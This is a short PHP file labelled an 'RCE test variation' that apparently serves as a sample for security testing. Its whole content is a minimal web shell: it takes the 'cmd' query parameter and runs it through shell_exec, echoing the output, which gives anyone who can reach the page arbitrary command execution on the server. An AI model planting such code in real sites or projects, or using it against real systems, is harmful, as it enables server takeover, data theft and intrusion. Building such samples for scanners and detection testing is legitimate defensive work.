<?php
// RCE test variation #1466
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>